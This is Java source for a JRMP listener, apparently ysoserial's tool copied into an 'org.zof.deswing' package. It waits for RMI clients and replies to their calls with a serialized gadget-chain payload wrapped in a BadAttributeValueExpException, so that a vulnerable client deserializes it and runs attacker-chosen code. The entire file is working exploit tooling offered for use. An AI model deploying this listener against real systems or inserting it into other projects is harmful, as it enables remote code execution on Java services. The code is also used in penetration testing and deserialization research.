package org.zof.deswing.listener;


import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.rmi.transport.TransportConstants;
import ysoserial.payloads.ObjectPayload.Utils;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;
import java.io.*;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Arrays;


/**
 * Generic JRMP listener
 *
 * Opens up an JRMP listener that will deliver the specified payload to any
 * client connecting to it and making a call.
 *
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "restriction"
} )
public class JRMPListener implements Runnable {

    private int port;
    private Object payloadObject;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private URL classpathUrl;

    public int getPort() {
        return port;
    }

    public void setPort(int port) {
        this.port = port;
    }

    public Object getPayloadObject() {
        return payloadObject;
    }

    public void setPayloadObject(Object payloadObject) {
        this.payloadObject = payloadObject;
    }

    public ServerSocket getSs() {
        return ss;
    }

    public void setSs(ServerSocket ss) {
        this.ss = ss;
    }

    public Object getWaitLock() {
        return waitLock;
    }

    public void setWaitLock(Object waitLock) {
        this.waitLock = waitLock;
    }

    public boolean isExit() {
        return exit;
    }

    public void setExit(boolean exit) {
        this.exit = exit;
    }

    public boolean isHadConnection() {
        return hadConnection;
    }

    public void setHadConnection(boolean hadConnection) {
        this.hadConnection = hadConnection;
    }

    public URL getClasspathUrl() {
        return classpathUrl;
    }

    public void setClasspathUrl(URL classpathUrl) {
        this.classpathUrl = classpathUrl;
    }

    public JRMPListener(int port, Object payloadObject ) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }

    public JRMPListener(int port, String className, URL classpathUrl) throws IOException {
        this.port = port;
        this.payloadObject = makeDummyObject(className);
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public boolean waitFor ( int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            System.err.println("Waiting for connection");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }


    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }


    public static final void main ( final String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(JRMPListener.class.getName() + " <port> <payload_type> <payload_arg>");
            System.exit(-1);
            return;
        }

        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);

        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);
    }


    public void run () {
        try {
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        DataInputStream in = new DataInputStream(bufIn);
                        int magic = in.readInt();

                        short version = in.readShort();
                        if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                            s.close();
                            continue;
                        }

                        OutputStream sockOut = s.getOutputStream();
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                        DataOutputStream out = new DataOutputStream(bufOut);

                        byte protocol = in.readByte();
                        switch ( protocol ) {
                        case TransportConstants.StreamProtocol:
                            out.writeByte(TransportConstants.ProtocolAck);
                            if ( remote.getHostName() != null ) {
                                out.writeUTF(remote.getHostName());
                            } else {
                                out.writeUTF(remote.getAddress().toString());
                            }
                            out.writeInt(remote.getPort());
                            out.flush();
                            in.readUTF();
                            in.readInt();
                        case TransportConstants.SingleOpProtocol:
                            doMessage(s, in, out, this.payloadObject);
                            break;
                        default:
                        case TransportConstants.MultiplexProtocol:
                            System.err.println("Unsupported protocol");
                            s.close();
                            continue;
                        }

                        bufOut.flush();
                        out.flush();
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
        case TransportConstants.Call:
            // service incoming RMI call
            doCall(in, out, payload);
            break;

        case TransportConstants.Ping:
            // send ack for ping
            out.writeByte(TransportConstants.PingAck);
            break;

        case TransportConstants.DGCAck:
            UID u = UID.read(in);
            break;

        default:
            throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                if ( "[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ( "java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }


        if ( read.hashCode() == 2 ) {
            ois.readInt(); // method
            ois.readLong(); // hash
            System.err.println("Is DGC call for " + Arrays.toString((ObjID[])ois.readObject()));
        }

        System.err.println("Sending return with payload for obj " + read);

        out.writeByte(TransportConstants.Return);// transport op
        ObjectOutputStream oos = new JRMPClient.MarshalOutputStream(out, this.classpathUrl);

        oos.writeByte(TransportConstants.ExceptionalReturn);
        new UID().write(oos);

        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(ex, "val", payload);
        oos.writeObject(ex);

        oos.flush();
        out.flush();

        this.hadConnection = true;
        synchronized ( this.waitLock ) {
            this.waitLock.notifyAll();
        }
    }

    @SuppressWarnings({"deprecation"})
    protected static Object makeDummyObject (String className) {
        try {
            ClassLoader isolation = new ClassLoader() {};
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }


    public static class Dummy implements Serializable {
        private static final long serialVersionUID = 1L;

    }
}
